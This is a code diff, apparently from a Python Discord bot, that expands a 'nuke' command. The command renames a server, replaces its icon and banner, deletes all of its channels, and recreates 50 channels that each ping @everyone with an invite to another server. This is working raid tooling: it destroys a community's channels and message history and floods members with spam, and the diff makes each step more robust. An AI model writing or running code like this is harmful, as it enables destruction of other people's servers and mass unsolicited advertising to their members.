@@ -42448,43 +42448,76 @@ async def nuke_cmd(ctx: commands.Context):
 
     # ── Executa o nuke ────────────────────────────────────────────────────────
     guild = ctx.guild
-    settings = get_settings(guild.id)
+    _nuke_log: list[str] = []
 
+    # 1. Renomear
+    try:
+        await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", reason="Nuke")
+        _nuke_log.append("✅ Nome alterado")
+        print(f"[nuke] nome alterado {guild.id}", flush=True)
+    except Exception as _en:
+        _nuke_log.append(f"❌ Nome: {type(_en).__name__}: {_en}")
+        print(f"[nuke] erro nome {guild.id}: {type(_en).__name__}: {_en}", flush=True)
+
+    # 2. Ícone
     try:
         import aiohttp as _ah_nuke
-        _icon_url   = "https://cdn.discordapp.com/attachments/1522437136467365950/1522491015125139506/43493532-ea1d-471a-baa4-495911ca60a8.png"
-        _banner_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522489678555512943/58abd6a6-5b73-4135-aa87-3339d5271c10.png"
-        async with _ah_nuke.ClientSession() as _s_nuke:
-            async with _s_nuke.get(_icon_url) as _r_icon:
+        _icon_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522491015125139506/43493532-ea1d-471a-baa4-495911ca60a8.png"
+        async with _ah_nuke.ClientSession() as _s_icon:
+            async with _s_icon.get(_icon_url) as _r_icon:
                 _icon_bytes = await _r_icon.read()
-            async with _s_nuke.get(_banner_url) as _r_banner:
-                _banner_bytes = await _r_banner.read()
-        await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!", icon=_icon_bytes, banner=_banner_bytes, reason="Nuke")
-        print(f"[nuke] servidor {guild.id} renomeado e foto/banner alterados", flush=True)
-    except Exception as _e_guild:
-        print(f"[nuke] erro ao editar servidor {guild.id}: {type(_e_guild).__name__}: {_e_guild}", flush=True)
-        try:
-            await guild.edit(name="NATA MIGRAMOS NOVO SERVIDOR!")
-        except Exception as _e2:
-            print(f"[nuke] erro ao renomear: {_e2}", flush=True)
+        await guild.edit(icon=_icon_bytes, reason="Nuke icon")
+        _nuke_log.append("✅ Ícone alterado")
+        print(f"[nuke] ícone alterado {guild.id}", flush=True)
+    except Exception as _ei:
+        _nuke_log.append(f"❌ Ícone: {type(_ei).__name__}: {_ei}")
+        print(f"[nuke] erro ícone {guild.id}: {type(_ei).__name__}: {_ei}", flush=True)
 
+    # 3. Banner
+    try:
+        import aiohttp as _ah_nuke2
+        _banner_url = "https://cdn.discordapp.com/attachments/1522437136467365950/1522489678555512943/58abd6a6-5b73-4135-aa87-3339d5271c10.png"
+        async with _ah_nuke2.ClientSession() as _s_banner:
+            async with _s_banner.get(_banner_url) as _r_banner:
+                _banner_bytes = await _r_banner.read()
+        await guild.edit(banner=_banner_bytes, reason="Nuke banner")
+        _nuke_log.append("✅ Banner alterado")
+        print(f"[nuke] banner alterado {guild.id}", flush=True)
+    except Exception as _eb:
+        _nuke_log.append(f"❌ Banner: {type(_eb).__name__}: {_eb}")
+        print(f"[nuke] erro banner {guild.id}: {type(_eb).__name__}: {_eb}", flush=True)
+
+    # 4. Deletar canais
     for ch in list(guild.channels):
         try:
             await ch.delete(reason="Nuke — comando do dono")
         except Exception:
             pass
 
-    # ── Recria 50 canais "nata" com a mensagem de divulgação ─────────────────
+    # 5. Recriar 50 canais "nata" com divulgação
+    _first_ch = None
     for _ in range(50):
         try:
-            ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
-            await ch.send(
+            _new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
+            await _new_ch.send(
                 content="**NOVO SERVIDOR MIGRAMOS**\n\nhttps://discord.gg/nata\n\n|| @everyone here ||",
                 allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
             )
+            if _first_ch is None:
+                _first_ch = _new_ch
         except Exception:
             pass
         await asyncio.sleep(0.5)
+
+    # 6. Enviar status no primeiro canal criado
+    if _first_ch and _nuke_log:
+        try:
+            await _first_ch.send(
+                "**[nuke] resultado:**\n" + "\n".join(_nuke_log),
+                allowed_mentions=discord.AllowedMentions.none(),
+            )
+        except Exception:
+            pass
 
 
 # =============================================================================
